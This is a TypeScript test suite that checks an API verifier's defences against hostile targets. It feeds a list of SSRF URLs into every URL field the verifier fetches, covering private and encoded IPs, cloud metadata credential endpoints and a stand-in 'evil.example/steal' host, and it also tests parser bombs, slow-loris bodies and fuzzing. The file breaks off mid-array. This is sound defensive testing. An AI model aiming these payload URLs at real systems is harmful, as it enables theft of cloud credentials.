/**
 * VERIFIER-INTEGRITY (ax-e6b.56.4) — the adversarial discipline api.qa demands
 * of its TARGETS, turned on api.qa ITSELF. Every hostile-target fixture here is
 * driven through the REAL Observer / observeTarget / runChecks pipeline (never a
 * mocked-out grader), and asserts the verifier:
 *   - does NOT fetch the forbidden host (no SSRF egress),
 *   - does NOT crash (no throw / unhandled rejection),
 *   - does NOT hang past a bound (readCapped + the ax-gf2 armed timer hold),
 *   - returns the CORRECT verdict — refused / failed, NEVER a false pass.
 *
 * Four corpora, per the ax-e6b.56.4 brief:
 *   (a) RED-TEAM FIXTURE CORPUS — an SSRF variant in EVERY url field the
 *       verifier fetches, plus parser-bomb / DoS bodies.
 *   (b) PARSER FUZZING — a seeded (deterministic) property test over the JSON /
 *       MCP / SSE / CSP parsers: no throw, no time-bound exceed, no egress.
 *   (c) DISCRIMINATING-FIXTURE INVARIANT — for each requirement, a KNOWN-
 *       NON-COMPLIANT fixture FAILS while the compliant one PASSES (a rubber-
 *       stamp / lockstep-escape verifier is caught here — generalizes ax-2dd).
 *   (d) SESSION-BUG PERMANENT REGRESSIONS — this estate's found-and-fixed bugs
 *       encoded as fixtures; a FALSE-PASS on any = the regression is back.
 *
 * This suite builds ON test/ssrf.test.ts, test/http-slow-body.test.ts,
 * test/mcp-ui.test.ts and test/ui-stream.test.ts — it does not duplicate their
 * cases, it generalizes them into an un-riggable integrity gate.
 */

import { describe, it, expect } from 'vitest'
import {
  Observer,
  isPrivateHost,
  isPubliclyRoutableSameOrigin,
  isPublicHttpsOffOriginAllowed,
  normalizeTarget,
  type Fetcher,
} from '../src/http.js'
import {
  observeTarget,
  parseAgentsJson,
  parseServerJson,
  parseOpenapi,
  parseJsonRpcMessage,
  isMcpUiMime,
} from '../src/discovery.js'
import { runChecks, cspScriptHash } from '../src/checks.js'
import { GOOD, goodTargetRoutes, makeFetcher, withOverrides, type Routes } from './helpers.js'
import type { Evidence } from '../src/types.js'

// ===========================================================================
// Shared adversarial harness
// ===========================================================================

/** A distinctive marker served by any host the SSRF guard WRONGLY let through —
 * its presence anywhere in the Evidence bundle is a proven credential leak. */
const SECRET = 'METADATA-CREDS-role-ABCDEF-secret-do-not-exfiltrate'

/**
 * A fetcher that records every URL requested and — critically — answers ANY
 * host other than the target origin with the SECRET body. So if a guard slips
 * and the verifier DOES fetch a private/off-origin host, the leak is detectable
 * (the SECRET lands in the bundle); when the guard holds, that host is never
 * called at all. This proves the GUARD stops egress, not the mock.
 */
function trapFetcher(routes: Routes, origin = GOOD): { fetcher: Fetcher; calls: string[] } {
  const calls: string[] = []
  const base = makeFetcher(routes, origin)
  const targetHost = new URL(origin).hostname
  const fetcher: Fetcher = async (url, init) => {
    calls.push(url)
    let host = ''
    try { host = new URL(url).hostname } catch { /* unparseable */ }
    if (host !== targetHost) {
      return new Response(SECRET, { status: 200, headers: { 'content-type': 'text/plain' } })
    }
    return base(url, init)
  }
  return { fetcher, calls }
}

/** Every hostname the fetcher was asked to reach. */
function hostsOf(calls: string[]): string[] {
  return calls.map((u) => { try { return new URL(u).hostname } catch { return u } })
}

/** True when the SECRET (a leaked off-origin/metadata body) is nowhere in the bundle. */
function noSecretLeak(bundle: { items: Evidence[] }): boolean {
  return bundle.items.every((e) => !(e.body ?? '').includes(SECRET))
}

/** The good.example agents.json card, as a mutable object. */
function baseCard(): Record<string, unknown> {
  const out = goodTargetRoutes()['GET /.well-known/agents.json']!({ method: 'GET', accept: 'application/json' })
  return JSON.parse(out.body!) as Record<string, unknown>
}

/** Routes that serve a mutated card at the well-known. */
function cardRoutes(card: Record<string, unknown>): Routes {
  return withOverrides(goodTargetRoutes(), {
    'GET /.well-known/agents.json': () => ({ status: 200, contentType: 'application/json', body: JSON.stringify(card) }),
  })
}

function verdictOf(checks: ReturnType<typeof runChecks>, id: string) {
  return checks.find((c) => c.id === id)?.verdict
}
function detailOf(checks: ReturnType<typeof runChecks>, id: string) {
  return checks.find((c) => c.id === id)?.detail ?? ''
}

// ===========================================================================
// (a) RED-TEAM FIXTURE CORPUS — SSRF in every url field the verifier fetches
// ===========================================================================

/**
 * The SSRF variant catalogue. Each is a hostile ABSOLUTE url an adversarial
 * card / manifest can plant. For the SAME-ORIGIN-gated fields (openapi,
 * offerProbe, mcp.url, uiMessageStream.url, serverJson pointer) EVERY one of
 * these is off-origin from good.example, so isPubliclyRoutableSameOrigin drops
 * it; the numeric-encoding + userinfo forms additionally exercise isPrivateHost
 * so the drop holds even if a future call site ever compared only hosts.
 */
const SSRF_VARIANTS: Array<{ label: string; url: string }> = [
  // Private RFC-1918
  { label: 'private 10.x', url: 'http://10.0.0.1/x' },
  { label: 'private 172.16.x', url: 'http://172.16.0.1/x' },
  { label: 'private 172.31.x', url: 'http://172.31.255.1/x' },
  { label: 'private 192.168.x', url: 'http://192.168.1.1/x' },
  { label: 'loopback 127.x', url: 'http://127.0.0.1/x' },
  // Link-local + cloud metadata
  { label: 'link-local 169.254.x', url: 'http://169.254.1.1/x' },
  { label: 'AWS metadata', url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/role' },
  { label: 'GCP metadata host', url: 'http://metadata.google.internal/computeMetadata/v1/' },
  { label: 'Alibaba/Oracle metadata 100.100.100.200', url: 'http://100.100.100.200/latest/meta-data' },
  // IPv6
  { label: 'IPv6 loopback [::1]', url: 'http://[::1]/x' },
  { label: 'IPv6 mapped v4 [::ffff:127.0.0.1]', url: 'http://[::ffff:127.0.0.1]/x' },
  { label: 'IPv6 ULA [fc00::1]', url: 'http://[fc00::1]/x' },
  { label: 'IPv6 link-local [fe80::1]', url: 'http://[fe80::1]/x' },
  // Numeric IPv4 encodings (decimal / hex / octal / short-form)
  { label: 'decimal IP 2852039166', url: 'http://2852039166/x' },
  { label: 'hex IP 0xA9FEA9FE', url: 'http://0xA9FEA9FE/x' },
  { label: 'dotted octal 0251.0376.0251.0376', url: 'http://0251.0376.0251.0376/x' },
  { label: 'short-form 127.1', url: 'http://127.1/x' },
  // userinfo trick — authority userinfo hides a private host
  { label: 'userinfo trick good.example@169.254.169.254', url: 'http://good.example@169.254.169.254/latest/meta-data' },
  // off-origin public (not private, but still off the target's own origin)
  { label: 'off-origin evil host', url: 'https://evil.example/steal' },
]

/**
 * The card fields the verifier resolves a url from, each SSRF-gated same-origin.
 * Every injector returns Routes whose card carries the hostile url in ONE field.
 */
const SAME_ORIGIN_URL_FIELDS: Array<{
  field: string
  inject: (url: string) => Routes
  /** the check that must FAIL (fail-closed) when the field is hostile */
  failedCheck: string
}> = [
  {
    field: 'agents.json openapi',
    failedCheck: 'openapi',
    inject: (url) => { const c = baseCard(); c.openapi = url; return cardRoutes(c) },
  },
  {
    field: 'monetization.probe.url (offerProbe)',
    failedCheck: 'offers-402',
    inject: (url) => {
      const c = baseCard()
      ;(c.monetization as Record<string, unknown>).probe = { method: 'GET', url }
      return cardRoutes(c)
    },
  },
  {
    // mcp-declared is PRESENCE-grade (the card DID declare an MCP interface), so
    // it legitimately still passes; the fail-closed signal for a hostile mcp.url
    // is the OAuth resource check — the hostile url is dropped (never probed), so
    // no protected-resource metadata is observed and the check fails.
    field: 'interfaces.mcp.url',
    failedCheck: 'mcp-oauth-protected-resource',
    inject: (url) => {
      const c = baseCard()
      ;(c.interfaces as Record<string, unknown>).mcp = { transport: 'streamable-http', url, tools: ['list_widgets'] }
      return cardRoutes(c)
    },
  },
  {
    field: 'interfaces.uiMessageStream.url',
    failedCheck: 'ui-stream-transport',
    inject: (url) => {
      const c = baseCard()
      ;(c.interfaces as Record<string, unknown>).uiMessageStream = { url }
      return cardRoutes(c)
    },
  },
]

describe('(a) SSRF — a hostile url in every SAME-ORIGIN-gated card field is refused, never fetched', () => {
  for (const { field, inject, failedCheck } of SAME_ORIGIN_URL_FIELDS) {
    describe(field, () => {
      for (const { label, url } of SSRF_VARIANTS) {
        it(`${label}: never fetched off good.example, no leak, no crash, ${failedCheck} fails closed`, async () => {
          const { fetcher, calls } = trapFetcher(inject(url))
          const observer = new Observer({ fetcher, delayMs: 0 })
          // MUST NOT throw.
          const bundle = await observeTarget(GOOD, observer, 42)
          const checks = runChecks(bundle)

          // No egress off the target origin.
          expect(hostsOf(calls).every((h) => h === 'good.example')).toBe(true)
          // No credential/metadata body captured.
          expect(noSecretLeak(bundle)).toBe(true)
          if (failedCheck === 'ui-stream-transport') {
            // uiMessageStream.url is dropped BEFORE any fetch (the same-origin
            // gate in observeUiStream / isPubliclyRoutableSameOrigin), so no
            // stream evidence is EVER recorded for this fixture and
            // ui-stream-transport honestly SKIPs (declared: false) — it can
            // never reach 'pass' regardless of whether the *internal* judge
            // logic (header/content-type checks) is correct, so asserting
            // "not pass" here is not a discriminator on this check. The two
            // assertions above (no off-origin call, no leaked secret) ARE the
            // load-bearing SSRF property this row guards — they fail if the
            // same-origin drop at observeUiStream ever lets the hostile url
            // through. Assert the honest, correct outcome explicitly instead
            // of a vague "not pass" that would pass even if this were broken.
            expect(verdictOf(checks, failedCheck), `${failedCheck}: ${detailOf(checks, failedCheck)}`).toBe('skip')
          } else {
            // The surface fails closed (never a false pass).
            expect(verdictOf(checks, failedCheck), `${failedCheck}: ${detailOf(checks, failedCheck)}`).not.toBe('pass')
          }
        })
      }
    })
  }
})

/**
 * OFF-ORIGIN-ALLOWED field: server.json remotes[0].url. Here off-origin is
 * LEGAL (a registry remote MAY be hosted elsewhere) — so the gate is
 * isPublicHttpsOffOriginAllowed: https + public + non-private. A private / IP-
 * literal / cleartext remote must be refused WITHOUT a byte leaving, and
 * mcp-remote-live must FAIL (declared-but-dead), never pass.
 */
function serverJsonRemoteRoutes(remoteUrl: string): Routes {
  return withOverrides(goodTargetRoutes(), {
    'GET /.well-known/mcp/server.json': () => ({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({
        name: 'com.evil/widget',
        version: '1.0.0',
        remotes: [{ type: 'streamable-http', url: remoteUrl }],
      }),
    }),
  })
}

const SSRF_REMOTE_VARIANTS: string[] = [
  'https://169.254.169.254/mcp', // metadata over https
  'https://10.0.0.1/mcp',
  'https://192.168.1.1/mcp',
  'https://[::1]/mcp',
  'https://[::ffff:127.0.0.1]/mcp',
  'https://metadata.google.internal/mcp',
  'https://100.100.100.200/mcp',
  'https://2852039166/mcp', // decimal
  'https://0xA9FEA9FE/mcp', // hex
  'http://good-remote.example/mcp', // cleartext off-origin — refused (no https)
]

describe('(a) SSRF — a hostile server.json remotes[0].url (off-origin-allowed field) is refused', () => {
  for (const remote of SSRF_REMOTE_VARIANTS) {
    it(`${remote}: never fetched, no leak, mcp-remote-live fails closed`, async () => {
      // A trap scoped to the FORBIDDEN remote host only: it leaks the SECRET
      // solely from that host (so a slipped fetch is detectable), while any
      // LEGITIMATE off-origin infra host the verifier may touch (dns.google DoH,
      // the registry, a namespace-domain well-known) 404s — those are not the
      // SSRF surface under test and must not masquerade as a leak.
      let remoteHost = ''
      try { remoteHost = new URL(remote).hostname } catch { /* */ }
      const base = makeFetcher(serverJsonRemoteRoutes(remote))
      const calls: string[] = []
      const fetcher: Fetcher = async (url, init) => {
        calls.push(url)
        let host = ''
        try { host = new URL(url).hostname } catch { /* */ }
        if (host === 'good.example') return base(url, init)
        if (host === remoteHost) return new Response(SECRET, { status: 200, headers: { 'content-type': 'text/plain' } })
        return new Response(JSON.stringify({ error: 'not found' }), { status: 404, headers: { 'content-type': 'application/json' } })
      }
      const observer = new Observer({ fetcher, delayMs: 0 })
      const bundle = await observeTarget(GOOD, observer, 42)
      const checks = runChecks(bundle)

      expect(hostsOf(calls)).not.toContain(remoteHost)
      expect(noSecretLeak(bundle)).toBe(true)
      const live = verdictOf(checks, 'mcp-remote-live')
      expect(live, `mcp-remote-live: ${detailOf(checks, 'mcp-remote-live')}`).toBe('fail')
    })
  }
})

/**
 * Redirect-hop SSRF, generalized across roles: a perfectly-legal same-origin
 * GET probe whose server answers 302 → private/metadata. The manual redirect
 * follower must re-validate the hop and fail closed. (test/ssrf.test.ts proves
 * this for the offer probe; here we prove it for the openapi role too.)
 */
describe('(a) SSRF — a 302 hop to a private/metadata Location is not followed (openapi role)', () => {
  for (const location of ['http://169.254.169.254/latest/meta-data', 'https://evil.example/steal']) {
    it(`openapi 302 → ${location} is not followed; openapi fails closed, no leak`, async () => {
      const routes = withOverrides(goodTargetRoutes(), {
        'GET /openapi.json': () => ({ status: 302, contentType: 'text/plain', body: '', headers: { location } }),
      })
      const { fetcher, calls } = trapFetcher(routes)
      const observer = new Observer({ fetcher, delayMs: 0 })
      const bundle = await observeTarget(GOOD, observer, 42)
      const checks = runChecks(bundle)

      let host = ''
      try { host = new URL(location).hostname } catch { /* */ }
      expect(hostsOf(calls)).not.toContain(host)
      expect(noSecretLeak(bundle)).toBe(true)
      expect(verdictOf(checks, 'openapi')).not.toBe('pass')
    })
  }
})

/**
 * Structural guards in ISOLATION — a fast, encoding-exhaustive corpus that pins
 * the whack-a-mole-proof layer directly. isPrivateHost must catch every
 * private / metadata / numeric-encoded form; the two same-origin / off-origin
 * gates must refuse them; normalizeTarget (the entry gate) must refuse them.
 */
describe('(a) SSRF — structural guards refuse every encoding, admit only public DNS hosts', () => {
  const PRIVATE_HOSTS = [
    '10.0.0.1', '172.16.0.1', '172.31.255.255', '192.168.0.1', '127.0.0.1',
    '169.254.1.1', '169.254.169.254', 'metadata.google.internal', '100.100.100.200',
    '0.0.0.0', 'localhost', 'db.internal', 'svc.local',
    '2852039166', '0xA9FEA9FE', '0251.0376.0251.0376', '0177.0.0.1', '127.1',
    '2130706433', '0x7f000001',
  ]
  for (const h of PRIVATE_HOSTS) {
    it(`isPrivateHost refuses ${h}`, () => expect(isPrivateHost(h)).toBe(true))
  }
  it('isPrivateHost admits genuine public DNS hosts (no over-block)', () => {
    for (const h of ['good.example', 'api.example.com', 'registry.modelcontextprotocol.io', 'dns.google']) {
      expect(isPrivateHost(h)).toBe(false)
    }
  })

  it('isPubliclyRoutableSameOrigin drops off-origin AND same-origin-private', () => {
    expect(isPubliclyRoutableSameOrigin('https://evil.example/x', 'https://good.example')).toBe(false)
    expect(isPubliclyRoutableSameOrigin('http://169.254.169.254/x', 'https://good.example')).toBe(false)
    expect(isPubliclyRoutableSameOrigin('https://good.example/openapi.json', 'https://good.example')).toBe(true)
  })

  it('isPublicHttpsOffOriginAllowed refuses cleartext, IP-literal, and private hosts', () => {
    expect(isPublicHttpsOffOriginAllowed('http://good-remote.example/mcp')).toBe(false) // cleartext
    expect(isPublicHttpsOffOriginAllowed('https://169.254.169.254/mcp')).toBe(false)
    expect(isPublicHttpsOffOriginAllowed('https://10.0.0.1/mcp')).toBe(false)
    expect(isPublicHttpsOffOriginAllowed('https://2852039166/mcp')).toBe(false)
    expect(isPublicHttpsOffOriginAllowed('https://[::1]/mcp')).toBe(false)
    expect(isPublicHttpsOffOriginAllowed('https://good-remote.example/mcp')).toBe(true) // the legit case
  })

  it('normalizeTarget (entry gate) refuses private/IP-literal/single-label targets', () => {
    for (const t of ['169.254.169.254', '10.0.0.1', 'localhost', '2852039166', 'http://127.0.0.1:8787']) {
      expect('error' in normalizeTarget(t)).toBe(true)
    }
    expect(normalizeTarget('good.example')).toEqual({ origin: 'https://good.example' })
  })
})

// ===========================================================================
// (a) PARSER BOMBS / DoS — bounded body + no crash + bounded time
// ===========================================================================

/** A ReadableStream that emits one chunk then stalls until the abort signal. */
function stallingBody(firstChunk = 'hi'): (init?: RequestInit) => Response {
  return (init?: RequestInit) => {
    const signal = init?.signal
    const stream = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(new TextEncoder().encode(firstChunk))
        const onAbort = () => {
          const e = new Error('The operation was aborted'); e.name = 'AbortError'
          controller.error(e)
        }
        if (signal) {
          if (signal.aborted) onAbort()
          else signal.addEventListener('abort', onAbort, { once: true })
        }
      },
    })
    return new Response(stream, { status: 200, headers: { 'content-type': 'text/plain' } })
  }
}

describe('(a) parser bombs / DoS — readCapped bound + ax-gf2 timer bound hold, no crash', () => {
  it('a multi-megabyte body is truncated to maxBodyBytes, never fully buffered', async () => {
    const maxBodyBytes = 262_144
    const fetcher: Fetcher = async () => {
      const stream = new ReadableStream<Uint8Array>({
        start(controller) {
          for (let i = 0; i < 40; i++) controller.enqueue(new Uint8Array(64 * 1024).fill(65)) // 2.5 MB
          controller.close()
        },
      })
      return new Response(stream, { status: 200, headers: { 'content-type': 'application/json' } })
    }
    const observer = new Observer({ fetcher, delayMs: 0, timeoutMs: 5000, maxBodyBytes })
    const ev = await observer.observe('probe:bomb', 'https://good.example/big', { accept: '*/*' })
    expect(ev.status).toBe(200)
    expect(ev.body?.length).toBe(maxBodyBytes)
  })

  // (the Content-Length fast-path — an over-declared length refused before a
  //  body byte is read — is proven in test/http-readcapped.test.ts; not duplicated here.)

  it('a slow-loris dripped body is aborted at ~timeoutMs, not held toward the cap', async () => {
    const timeoutMs = 120
    const fetcher: Fetcher = async (_url, init) => stallingBody('{')(init)
    const observer = new Observer({ fetcher, delayMs: 0, timeoutMs })
    const t0 = Date.now()
    const ev = await observer.observe('probe:drip', 'https://good.example/drip', { accept: '*/*' })
    expect(Date.now() - t0).toBeLessThan(timeoutMs * 8)
    expect(ev.status).toBeNull()
    expect(ev.error).toMatch(/AbortError/)
  })

  it('a 100K-newline body flows through the whole pipeline without crash or hang', async () => {
    const bomb = 'data: ' + '\n'.repeat(100_000)
    const routes = withOverrides(goodTargetRoutes(), {
      'GET /openapi.json': () => ({ status: 200, contentType: 'application/json', body: bomb }),
      'GET /api/status': () => ({ status: 200, contentType: 'application/json', body: bomb }),
    })
    const observer = new Observer({ fetcher: makeFetcher(routes), delayMs: 0 })
    const t0 = Date.now()
    const bundle = await observeTarget(GOOD, observer, 42)
    const checks = runChecks(bundle)
    expect(Date.now() - t0).toBeLessThan(5000)
    expect(checks.length).toBeGreaterThan(0)
    expect(verdictOf(checks, 'openapi')).not.toBe('pass') // garbage body ⇒ not a valid contract
  })

  it('a deeply-nested JSON body does not crash the JSON/parity parsers', async () => {
    // Deep enough to be a bomb, small enough to fit under the 256KB body cap.
    const depth = 20_000
    const deep = '['.repeat(depth) + ']'.repeat(depth)
    // Direct parser fuzz targets: none may throw.
    expect(() => parseAgentsJson(safeJson(deep), GOOD)).not.toThrow()
    expect(() => parseServerJson(safeJson(deep))).not.toThrow()
    expect(() => parseOpenapi(safeJson(deep))).not.toThrow()
    // Through the pipeline as an openapi + twin body.
    const routes = withOverrides(goodTargetRoutes(), {
      'GET /openapi.json': () => ({ status: 200, contentType: 'application/json', body: deep }),
    })
    const observer = new Observer({ fetcher: makeFetcher(routes), delayMs: 0 })
    const bundle = await observeTarget(GOOD, observer, 42)
    expect(() => runChecks(bundle)).not.toThrow()
  })

  it('a JSON with a huge string value is bounded and does not crash', async () => {
    const huge = JSON.stringify({ openapi: '3.1.0', info: { title: 'x', version: '1' }, junk: 'A'.repeat(400_000) })
    const routes = withOverrides(goodTargetRoutes(), {
      'GET /openapi.json': () => ({ status: 200, contentType: 'application/json', body: huge }),
    })
    const observer = new Observer({ fetcher: makeFetcher(routes), delayMs: 0 })
    const bundle = await observeTarget(GOOD, observer, 42)
    expect(() => runChecks(bundle)).not.toThrow()
    const openapiEv = bundle.items.find((e) => e.role.includes('openapi'))
    expect((openapiEv?.body?.length ?? 0)).toBeLessThanOrEqual(262_144)
  })

  it('a ReDoS-catastrophic string in a CSS url() / script literal is scanned in bounded time', async () => {
    // A pathological input aimed at the self-containment ref scanners. The
    // property: the grader spends bounded time regardless of the string.
    const evil = 'url(' + 'a'.repeat(50_000) + '\n' + '\\'.repeat(50_000) + ')'
    const srcDoc = `<!doctype html><html><head><style>${evil}</style></head><body>${'&#x68;'.repeat(20_000)}</body></html>`
    const { checks, calls, elapsed } = await judgeMcpUi({ srcDoc })
    expect(elapsed).toBeLessThan(5000)
    // Never fetched anything off-origin while scanning.
    expect(hostsOf(calls).every((h) => h === 'good.example' || h === 'good-remote.example' || h === 'dns.google' || h === 'registry.modelcontextprotocol.io')).toBe(true)
    expect(verdictOf(checks, 'mcp-ui-self-contained')).toBeDefined()
  })
})

/** JSON.parse that returns the raw string when it does not parse (parsers accept unknown). */
function safeJson(s: string): unknown {
  try { return JSON.parse(s) } catch { return s }
}

// ===========================================================================
// (b) PARSER FUZZING — seeded, deterministic property test
// ===========================================================================

/** mulberry32 — a tiny, fully-deterministic seeded PRNG (stable CI). */
function mulberry32(seed: number): () => number {
  let a = seed >>> 0
  return () => {
    a |= 0; a = (a + 0x6d2b79f5) | 0
    let t = Math.imul(a ^ (a >>> 15), 1 | a)
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}

const FUZZ_ALPHABET = 'abc{}[]":,0123456789 \n\t\r\\/<>&#;.-_ui://data:https://[]::ffffDONE﻿typedeltatoolCallId'
function fuzzString(rng: () => number, maxLen = 300): string {
  const len = Math.floor(rng() * maxLen)
  let s = ''
  for (let i = 0; i < len; i++) s += FUZZ_ALPHABET[Math.floor(rng() * FUZZ_ALPHABET.length)]
  return s
}

/** A random Evidence carrying a fuzzed body (for the JSON-RPC / MCP parsers). */
function fuzzEvidence(rng: () => number): Evidence {
  return {
    role: 'probe:fuzz',
    url: 'https://good.example/mcp',
    method: 'POST',
    accept: 'application/json',
    status: 200,
    contentType: rng() < 0.5 ? 'application/json' : 'text/event-stream',
    headers: {},
    body: fuzzString(rng),
    elapsedMs: 0,
  }
}

describe('(b) parser fuzzing — 4000 seeded malformed inputs never throw, never exceed a time bound', () => {
  const SEED = 0x5eed_a11
  const ITERATIONS = 4000

  it(`parseJsonRpcMessage / parseMcpMessage twin: no throw over ${ITERATIONS} inputs`, () => {
    const rng = mulberry32(SEED)
    const t0 = Date.now()
    for (let i = 0; i < ITERATIONS; i++) {
      const ev = fuzzEvidence(rng)
      expect(() => parseJsonRpcMessage(ev)).not.toThrow()
    }
    expect(Date.now() - t0).toBeLessThan(5000)
  })

  it(`the JSON envelope parsers (agents.json / server.json / openapi): no throw over ${ITERATIONS} inputs`, () => {
    const rng = mulberry32(SEED ^ 0x1234)
    const t0 = Date.now()
    for (let i = 0; i < ITERATIONS; i++) {
      const raw = fuzzString(rng)
      const doc = safeJson(raw)
      expect(() => parseAgentsJson(doc, GOOD)).not.toThrow()
      expect(() => parseServerJson(doc)).not.toThrow()
      expect(() => parseOpenapi(doc)).not.toThrow()
      expect(() => isMcpUiMime(raw)).not.toThrow()
    }
    expect(Date.now() - t0).toBeLessThan(5000)
  })

  it(`the SSE UI-message-stream parser: no throw / no egress over fuzzed stream bodies`, async () => {
    const rng = mulberry32(SEED ^ 0xabcd)
    const t0 = Date.now()
    // Drive fuzzed SSE bodies through the REAL observeTarget/runChecks pipeline.
    for (let i = 0; i < 60; i++) {
      const body = Array.from({ length: 20 }, () => `data: ${fuzzString(rng, 80)}\n\n`).join('')
      const { checks, calls } = await judgeUiStream(body)
      expect(hostsOf(calls).every((h) => h === 'good.example')).toBe(true)
      expect(verdictOf(checks, 'ui-stream-framing')).toBeDefined()
    }
    expect(Date.now() - t0).toBeLessThan(15000)
  })

  it(`the CSP parser: no throw / no egress over fuzzed csp objects`, async () => {
    const rng = mulberry32(SEED ^ 0x7777)
    const dirs = ['default-src', 'script-src', 'script-src-elem', 'connect-src', 'form-action', 'base-uri', 'img-src', 'style-src']
    for (let i = 0; i < 60; i++) {
      const csp: Record<string, string> = {}
      for (const d of dirs) if (rng() < 0.6) csp[d] = fuzzString(rng, 40)
      const { checks, calls } = await judgeMcpUi({ csp })
      expect(hostsOf(calls).every((h) => h === 'good.example' || h === 'good-remote.example' || h === 'dns.google' || h === 'registry.modelcontextprotocol.io')).toBe(true)
      expect(verdictOf(checks, 'mcp-ui-self-contained')).toBeDefined()
    }
  })
})

// ===========================================================================
// MCP-UI / UI-stream fixture harnesses (compact, real-pipeline)
// ===========================================================================

const MCP_NAME = 'example.good/widget'
const MCP_REMOTE = 'https://good-remote.example/mcp'
const MCP_SERVER_JSON_URL = `${GOOD}/.well-known/mcp/server.json`
const MCP_TEMPLATE_URI = 'ui://widget/list_widgets'
const CLEAN_SCRIPT = `const s=window.__data||{};document.getElementById('w').textContent='ok'`
const CLEAN_HASH = cspScriptHash(CLEAN_SCRIPT)
const SRCDOC_CLEAN = `<!doctype html><html><head><style>body{font:14px system-ui}</style></head>
<body><ul id="w"></ul><script>${CLEAN_SCRIPT}</script></body></html>`

function closedCsp(...hashes: string[]): Record<string, string> {
  return {
    'default-src': "'none'",
    'script-src': (hashes.length ? hashes : [CLEAN_HASH]).join(' '),
    'connect-src': "'self'",
    'form-action': "'none'",
    'base-uri': "'none'",
  }
}

interface McpUiOpts {
  srcDoc?: string
  csp?: Record<string, string>
  structuredContent?: unknown
  content?: unknown
  mimeType?: string
}

function mcpUiTable(opts: McpUiOpts): Record<string, (init?: RequestInit) => { status: number; contentType?: string; body?: string; headers?: Record<string, string> }> {
  const jsonOut = (b: unknown) => ({ status: 200, contentType: 'application/json', body: JSON.stringify(b) })
  const table: Record<string, (init?: RequestInit) => { status: number; contentType?: string; body?: string; headers?: Record<string, string> }> = {}
  const rel = goodTargetRoutes()
  for (const [key, handler] of Object.entries(rel)) {
    const sp = key.indexOf(' ')
    const method = key.slice(0, sp)
    const path = key.slice(sp + 1)
    table[`${method} ${GOOD}${path}`] = (init) => handler({ method, accept: (init?.headers as Record<string, string>)?.accept ?? '*/*', body: typeof init?.body === 'string' ? init.body : undefined })
  }
  table[`GET ${MCP_SERVER_JSON_URL}`] = () => jsonOut({
    name: MCP_NAME, version: '1.2.3', description: 'x', websiteUrl: `${GOOD}/`,
    repository: { url: 'https://github.com/good/widget', source: 'github' },
    remotes: [{ type: 'streamable-http', url: MCP_REMOTE }],
  })
  const toolDefs = [
    { name: 'list_widgets', description: 'List all widgets for the account.', inputSchema: { type: 'object', properties: {}, required: [] }, _meta: { ui: { resourceUri: MCP_TEMPLATE_URI, widgetDescription: 'A live list of your widgets.' } }, annotations: { readOnlyHint: true, title: 'Widgets' } },
    { name: 'create_widget', description: 'Create a widget.', inputSchema: { type: 'object', required: ['name'] } },
  ]
  const callResult = () => jsonOut({
    jsonrpc: '2.0', id: 3,
    result: {
      content: opts.content !== undefined ? opts.content : [{ type: 'text', text: 'Here are your 3 widgets.' }],
      structuredContent: opts.structuredContent !== undefined ? opts.structuredContent : { count: 3, widgets: [{ id: 'w1' }, { id: 'w2' }, { id: 'w3' }] },
      _meta: { ui: { resourceUri: MCP_TEMPLATE_URI, csp: opts.csp ?? closedCsp() } },
    },
  })
  const resourceRead = () => jsonOut({
    jsonrpc: '2.0', id: 4,
    result: { contents: [{ uri: MCP_TEMPLATE_URI, mimeType: opts.mimeType ?? 'text/html;profile=mcp-app', text: opts.srcDoc ?? SRCDOC_CLEAN }] },
  })
  table[`POST ${MCP_REMOTE}`] = (init) => {
    let method = ''
    try { method = JSON.parse(typeof init?.body === 'string' ? init.body : '{}').method } catch { /* */ }
    if (method === 'tools/list') return jsonOut({ jsonrpc: '2.0', id: 2, result: { tools: toolDefs } })
    if (method === 'tools/call') return callResult()
    if (method === 'resources/read') return resourceRead()
    return { status: 200, contentType: 'application/json', headers: { 'mcp-session-id': 'sess-1' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, result: { protocolVersion: '2025-06-18', capabilities: { tools: {}, resources: {} }, serverInfo: { name: MCP_NAME, version: '1.2.3' } } }) }
  }
  return table
}

async function judgeMcpUi(opts: McpUiOpts): Promise<{ checks: ReturnType<typeof runChecks>; calls: string[]; elapsed: number }> {
  const table = mcpUiTable(opts)
  const calls: string[] = []
  const fetcher: Fetcher = async (url, init) => {
    calls.push(url)
    const method = (init?.method ?? 'GET').toUpperCase()
    const handler = table[`${method} ${url}`]
    if (!handler) return new Response(JSON.stringify({ error: 'not found' }), { status: 404, headers: { 'content-type': 'application/json' } })
    const out = handler(init)
    return new Response(out.body ?? '', { status: out.status, headers: { 'content-type': out.contentType ?? 'text/plain', ...(out.headers ?? {}) } })
  }
  const observer = new Observer({ fetcher, delayMs: 0 })
  const t0 = Date.now()
  const bundle = await observeTarget(GOOD, observer, 42)
  const checks = runChecks(bundle)
  return { checks, calls, elapsed: Date.now() - t0 }
}

async function judgeUiStream(body: string, opts: { header?: string | null; contentType?: string; status?: number } = {}): Promise<{ checks: ReturnType<typeof runChecks>; calls: string[] }> {
  const card = baseCard()
  ;(card.interfaces as Record<string, unknown>).uiMessageStream = { url: `${GOOD}/api/chat/stream` }
  const routes = withOverrides(cardRoutes(card), {
    'GET /api/chat/stream': () => ({
      status: opts.status ?? 200,
      contentType: opts.contentType ?? 'text/event-stream',
      headers: (opts.header === null ? {} : { 'x-vercel-ai-ui-message-stream': opts.header ?? 'v1' }) as Record<string, string>,
      body,
    }),
  })
  const calls: string[] = []
  const base = makeFetcher(routes)
  const fetcher: Fetcher = async (url, init) => { calls.push(url); return base(url, init) }
  const observer = new Observer({ fetcher, delayMs: 0, budget: 48 })
  const bundle = await observeTarget(GOOD, observer, 7)
  return { checks: runChecks(bundle), calls }
}

// ===========================================================================
// (c) DISCRIMINATING-FIXTURE INVARIANT — generalizes the ax-2dd lockstep escape
// ===========================================================================

/**
 * A rubber-stamp / lockstep-escape verifier passes (or fails) EVERYTHING
 * regardless of the target. The genuine property: for each requirement, a
 * COMPLIANT fixture PASSES the check AND a KNOWN-NON-COMPLIANT fixture FAILS the
 * SAME check. If either half breaks, the check does not discriminate — exactly
 * the class of bug ax-2dd was.
 */
const DISCRIMINATORS: Array<{ id: string; break: (r: Routes) => Routes }> = [
  {
    id: 'llms-txt',
